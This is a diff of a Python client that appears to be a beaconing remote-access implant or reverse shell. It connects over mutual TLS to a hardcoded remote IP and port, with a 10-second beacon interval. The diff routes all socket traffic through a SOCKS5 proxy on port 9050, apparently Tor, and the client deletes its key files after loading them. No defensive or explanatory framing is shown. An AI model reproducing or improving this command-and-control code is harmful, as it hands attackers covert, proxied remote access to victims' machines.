@@ -9,12 +9,13 @@ from signal import SIGTERM
 
 remote_ip = '206.189.39.65'
 remote_port = 8081
-proxy_ip = '95.216.33.245'
-proxy_port = 10250
+proxy_ip = '201.94.250.116'
+proxy_port = 9050
 server_sni_hostname = ''
 VERBOSE = True
 DEVNULL = subprocess.DEVNULL
 BEACON_INTERVAL = 10    #in seconds
+
 
 def create_keys():
     server_cert ='''\
@@ -162,9 +163,13 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
     context.check_hostname = False
     context.load_cert_chain(certfile='client_cert', keyfile='client_key')
     delete_keys()
-    s = socks.socksocket()
-    s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
+    #s = socks.socksocket()
+    #s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
+    socks.setdefaultproxy(proxy_type=socks.PROXY_TYPE_SOCKS5, addr=proxy_ip, port=proxy_port)
+    socket.socket = socks.socksocket
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    #s.settimeout(4)
+    #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     #socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
     #socket.socket = socks.socksocket
     #s = socks.socksocket()
@@ -175,12 +180,14 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
         conn.connect((remote_ip, remote_port))
         if VERBOSE:
             print_good("Connected!")
+            print_good("SSL established. Peer: {}".format(conn.getpeercert()))
     except ConnectionRefusedError:
         raise ConnectionRefusedError
     except socks.GeneralProxyError: 
         raise socks.GeneralProxyError("Connection closed unexpectedly")
-    if VERBOSE:
-        print_good("SSL established. Peer: {}".format(conn.getpeercert()))
+    except Exception as e:
+        if VERBOSE:
+            print(e)
 
     while True: 
         data = ""
